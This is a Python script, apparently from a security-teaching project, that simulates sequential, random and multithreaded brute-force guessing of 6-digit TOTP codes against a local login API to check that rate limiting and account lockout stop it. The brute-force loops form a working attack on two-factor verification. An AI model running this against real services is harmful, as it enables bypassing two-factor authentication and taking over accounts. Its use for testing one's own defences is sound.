#!/usr/bin/env python3
"""
attacks/attack_bruteforce.py — Scenario 1: Brute-Force Attack Simulator
========================================================================
Purpose: Demonstrate that rate-limiting and account lockout effectively
prevent brute-force enumeration of the 6-digit OTP keyspace.

⚠️  Educational Purpose Only. Test only against YOUR OWN system.

Usage:
    python attacks/attack_bruteforce.py --target http://localhost:5000
    python attacks/attack_bruteforce.py --target http://localhost:5000 --mode parallel --threads 5
"""

import argparse
import time
import requests
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime


TARGET_URL = "http://localhost:5000"


def create_test_session(base_url: str, username: str = "bruteforce_victim") -> str | None:
    """
    Create a test user and get a pending 2FA session token for attacking.
    Returns the session_token or None if setup failed.
    """
    print(f"\n[*] Setting up test target: {username}")

    # Register user
    r = requests.post(f"{base_url}/api/register", json={
        "username": username,
        "email": f"{username}@test.local",
        "password": "TestPass123!",
    })
    if r.status_code not in (201, 409):
        print(f"[!] Failed to create test user: {r.text}")
        return None, None

    # Login (Phase 1 — password)
    r = requests.post(f"{base_url}/api/login", json={
        "username": username,
        "password": "TestPass123!",
    })
    data = r.json()

    if not data.get("requires_2fa"):
        print("[!] User doesn't have 2FA enabled. Enrolling would be needed.")
        print("    Note: Without 2FA enabled, login completes without TOTP step.")
        print("    For this demo, 2FA must be enrolled via /enroll-2fa first.")
        return None, None

    session_token = data.get("session_token")
    print(f"[+] Got pending session token: {session_token[:8]}...")
    return session_token, username


# ── Mode 1: Sequential Brute-Force ───────────────────────────────────────

def bruteforce_sequential(base_url: str, session_token: str, max_attempts: int = 1000) -> dict:
    """
    Try OTP codes 000000, 000001, 000002, ... sequentially.

    Expected: Server blocks after 5 attempts (rate limit or account lockout).
    """
    print(f"\n{'='*60}")
    print("SCENARIO 1A: Sequential Brute-Force Attack")
    print(f"Trying codes 000000 to {max_attempts-1:06d}")
    print(f"{'='*60}")

    results = {
        "mode": "sequential",
        "total_attempts": 0,
        "rate_limited_at": None,
        "locked_at": None,
        "cracked": False,
        "cracked_code": None,
        "status_distribution": {},
        "start_time": time.time(),
        "elapsed": None,
    }

    for code_int in range(max_attempts):
        otp = f"{code_int:06d}"

        try:
            r = requests.post(
                f"{base_url}/api/verify-totp",
                json={"session_token": session_token, "totp_code": otp},
                timeout=5,
            )
        except requests.RequestException as e:
            print(f"[!] Request error at attempt {results['total_attempts']}: {e}")
            break

        results["total_attempts"] += 1
        status = r.status_code
        results["status_distribution"][status] = results["status_distribution"].get(status, 0) + 1

        # Print progress every 10 attempts
        if results["total_attempts"] % 10 == 0 or status != 401:
            print(f"  [{results['total_attempts']:>4}] OTP={otp} → HTTP {status}")

        if status == 429:
            results["rate_limited_at"] = results["total_attempts"]
            print(f"\n[!] RATE LIMITED after {results['total_attempts']} attempts!")
            print(f"    Server returned: {r.json()}")
            break
        elif status == 423:
            results["locked_at"] = results["total_attempts"]
            data = r.json()
            print(f"\n[!] ACCOUNT LOCKED after {results['total_attempts']} attempts!")
            print(f"    Retry after: {data.get('retry_after_seconds', '?')} seconds")
            break
        elif status == 200:
            results["cracked"] = True
            results["cracked_code"] = otp
            print(f"\n[!] CODE CRACKED: {otp} (attempt #{results['total_attempts']})")
            break

    results["elapsed"] = time.time() - results["start_time"]
    return results


# ── Mode 2: Random Brute-Force ────────────────────────────────────────────

def bruteforce_random(base_url: str, session_token: str, max_attempts: int = 500) -> dict:
    """
    Try random OTP codes (simulates smarter attacker avoiding obvious patterns).
    """
    print(f"\n{'='*60}")
    print("SCENARIO 1B: Random Brute-Force Attack")
    print(f"{'='*60}")

    results = {
        "mode": "random",
        "total_attempts": 0,
        "rate_limited_at": None,
        "locked_at": None,
        "start_time": time.time(),
    }

    tried = set()
    while results["total_attempts"] < max_attempts and len(tried) < 1_000_000:
        otp = f"{random.randint(0, 999999):06d}"
        if otp in tried:
            continue
        tried.add(otp)

        try:
            r = requests.post(
                f"{base_url}/api/verify-totp",
                json={"session_token": session_token, "totp_code": otp},
                timeout=5,
            )
        except requests.RequestException:
            break

        results["total_attempts"] += 1
        status = r.status_code

        if status in (429, 423):
            key = "rate_limited_at" if status == 429 else "locked_at"
            results[key] = results["total_attempts"]
            print(f"[!] BLOCKED (HTTP {status}) after {results['total_attempts']} attempts")
            break

    results["elapsed"] = time.time() - results["start_time"]
    return results


# ── Mode 3: Parallel Brute-Force ─────────────────────────────────────────

def bruteforce_parallel(base_url: str, session_token: str,
                        max_attempts: int = 100, threads: int = 5) -> dict:
    """
    Fire multiple concurrent requests to test IP-based rate limiting.
    """
    print(f"\n{'='*60}")
    print(f"SCENARIO 1C: Parallel Brute-Force ({threads} threads)")
    print(f"{'='*60}")

    results = {
        "mode": "parallel",
        "total_attempts": 0,
        "rate_limited_at": None,
        "locked_at": None,
        "start_time": time.time(),
        "status_distribution": {},
    }

    codes = [f"{i:06d}" for i in range(max_attempts)]

    def try_code(otp):
        try:
            r = requests.post(
                f"{base_url}/api/verify-totp",
                json={"session_token": session_token, "totp_code": otp},
                timeout=5,
            )
            return otp, r.status_code
        except Exception as e:
            return otp, -1

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(try_code, c): c for c in codes}
        for future in as_completed(futures):
            otp, status = future.result()
            results["total_attempts"] += 1
            results["status_distribution"][status] = results["status_distribution"].get(status, 0) + 1

            if results["total_attempts"] <= 20 or status != 401:
                print(f"  [{results['total_attempts']:>4}] OTP={otp} → HTTP {status}")

            if status == 429 and not results["rate_limited_at"]:
                results["rate_limited_at"] = results["total_attempts"]
            elif status == 423 and not results["locked_at"]:
                results["locked_at"] = results["total_attempts"]

    results["elapsed"] = time.time() - results["start_time"]
    return results


# ── Analysis & Reporting ──────────────────────────────────────────────────

def print_analysis(results: dict):
    print(f"\n{'='*60}")
    print("ATTACK ANALYSIS RESULTS")
    print(f"{'='*60}")
    print(f"Mode:          {results['mode']}")
    print(f"Total attempts: {results['total_attempts']}")
    print(f"Elapsed time:  {results.get('elapsed', 0):.2f}s")
    print(f"Rate:          {results['total_attempts'] / max(results.get('elapsed', 1), 0.001):.1f} req/s")
    print(f"\nOutcome:")
    if results.get("cracked"):
        print(f"  ❌ [VULNERABLE] Code cracked: {results['cracked_code']}")
    elif results.get("rate_limited_at"):
        print(f"  ✅ [PROTECTED]  Rate limited after {results['rate_limited_at']} attempts")
    elif results.get("locked_at"):
        print(f"  ✅ [PROTECTED]  Account locked after {results['locked_at']} attempts")
    else:
        print(f"  ⚠️  Attack stopped before block (continued beyond {results['total_attempts']} attempts)")

    print(f"\nHTTP Status Distribution:")
    for code, count in sorted(results.get("status_distribution", {}).items()):
        label = {200:"OK",401:"Unauthorized",423:"Locked",429:"Rate Limited"}.get(code, "Other")
        print(f"  HTTP {code} ({label}): {count} times")

    print(f"\nMathematical Analysis:")
    print(f"  Keyspace: 1,000,000 (6-digit codes)")
    block = results.get('rate_limited_at') or results.get('locked_at') or results['total_attempts']
    print(f"  Blocked after: {block} attempts")
    elapsed = results.get('elapsed', 1)
    rps = results['total_attempts'] / max(elapsed, 0.001)
    p_crack = min(1.0, rps * 30 / 1_000_000)
    print(f"  P(crack in 30s window at {rps:.0f} req/s) = {p_crack:.6%}")
    print(f"  With protection (blocked at {block}): P = {block/1_000_000:.6%}")

    windows_needed = 1_000_000 / max(block, 1)
    expected_days = windows_needed * 30 / 86400
    print(f"  Expected crack time: {expected_days:.1f} days ({windows_needed:.0f} attempts needed)")


# ── Main ──────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="TOTP Brute-Force Attack Simulator")
    parser.add_argument("--target", default="http://localhost:5000")
    parser.add_argument("--mode", choices=["sequential", "random", "parallel", "all"],
                        default="sequential")
    parser.add_argument("--max-attempts", type=int, default=50)
    parser.add_argument("--threads", type=int, default=5)
    parser.add_argument("--username", default=f"victim_{int(time.time())%1000}")
    args = parser.parse_args()

    print(f"🎯 TOTP Brute-Force Attack Simulator")
    print(f"   Target: {args.target}")
    print(f"   Mode:   {args.mode}")
    print(f"   Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"\n⚠️  Educational purpose only — test only on YOUR OWN system!")

    session_token, username = create_test_session(args.target, args.username)
    if not session_token:
        print("\n[!] Could not obtain session token. Ensure 2FA is enabled for the test user.")
        print("    Run the app, register, enroll 2FA, then re-run this script.")
        return

    if args.mode in ("sequential", "all"):
        r = bruteforce_sequential(args.target, session_token, args.max_attempts)
        print_analysis(r)

    if args.mode in ("random", "all"):
        session_token, _ = create_test_session(args.target, f"{username}_r")
        if session_token:
            r = bruteforce_random(args.target, session_token, args.max_attempts)
            print_analysis(r)

    if args.mode in ("parallel", "all"):
        session_token, _ = create_test_session(args.target, f"{username}_p")
        if session_token:
            r = bruteforce_parallel(args.target, session_token, args.max_attempts, args.threads)
            print_analysis(r)


if __name__ == "__main__":
    main()
